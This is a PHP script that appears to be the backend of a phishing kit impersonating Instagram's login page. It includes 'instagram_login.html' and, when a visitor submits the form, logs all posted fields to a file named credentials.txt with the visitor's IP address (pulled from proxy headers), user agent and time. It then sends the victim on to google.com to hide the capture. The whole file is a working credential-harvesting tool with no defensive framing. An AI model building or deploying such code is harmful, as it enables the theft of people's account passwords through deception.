<?php
function get_real_ip() {
    // Debug: Log all relevant headers
    $debug_file = "ip_debug.txt";
    $headers = "Headers received:\n";
    foreach($_SERVER as $key => $value) {
        if (strpos($key, 'HTTP_') === 0 || strpos($key, 'REMOTE_') === 0) {
            $headers .= "$key: $value\n";
        }
    }
    $headers .= "\n---\n";
    file_put_contents($debug_file, $headers, FILE_APPEND);

    $ip = '';

    // Priority 1: Check for IPv4 in forwarded headers
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $forwarded_ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        foreach ($forwarded_ips as $fwd_ip) {
            $fwd_ip = trim($fwd_ip);
            if (filter_var($fwd_ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE)) {
                $ip = $fwd_ip;
                break;
            } elseif (filter_var($fwd_ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
                $ip = $fwd_ip; // Accept private IPv4 too
            }
        }
    }

    // Priority 2: Check other IPv4 headers
    if (empty($ip)) {
        $ipv4_headers = [
            'HTTP_X_REAL_IP',
            'HTTP_CF_CONNECTING_IP',
            'HTTP_CLIENT_IP',
            'HTTP_X_CLUSTER_CLIENT_IP',
            'HTTP_X_ORIGINAL_FORWARDED_FOR'
        ];
        
        foreach ($ipv4_headers as $header) {
            if (!empty($_SERVER[$header])) {
                $header_ips = explode(',', $_SERVER[$header]);
                foreach ($header_ips as $hdr_ip) {
                    $hdr_ip = trim($hdr_ip);
                    if (filter_var($hdr_ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE)) {
                        $ip = $hdr_ip;
                        break 2;
                    } elseif (filter_var($hdr_ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
                        $ip = $hdr_ip;
                        break 2;
                    }
                }
            }
        }
    }

    // Priority 3: Check for IPv6 if no IPv4 found
    if (empty($ip)) {
        $ipv6_headers = [
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_REAL_IP',
            'HTTP_CF_CONNECTING_IP',
            'HTTP_CLIENT_IP',
            'HTTP_X_CLUSTER_CLIENT_IP',
            'HTTP_FORWARDED',
            'HTTP_X_ORIGINAL_FORWARDED_FOR'
        ];
        
        foreach ($ipv6_headers as $header) {
            if (!empty($_SERVER[$header])) {
                $header_ips = explode(',', $_SERVER[$header]);
                foreach ($header_ips as $hdr_ip) {
                    $hdr_ip = trim($hdr_ip);
                    if (filter_var($hdr_ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
                        $ip = $hdr_ip;
                        break 2;
                    }
                }
            }
        }
    }

    // Fallback to REMOTE_ADDR
    if (empty($ip)) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    // Final validation
    if (filter_var($ip, FILTER_VALIDATE_IP)) {
        return $ip;
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $log_file = "credentials.txt";
    $data = "";
    foreach($_POST as $key => $value) {
        $data .= "$key: $value\n";
    }
    $real_ip = get_real_ip();
    $data .= "IP: " . $real_ip . "\n";
    $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $data .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $data .= "---\n\n";
    file_put_contents($log_file, $data, FILE_APPEND | LOCK_EX);
    header("Location: https://google.com");
    exit();
}
include('instagram_login.html');
?>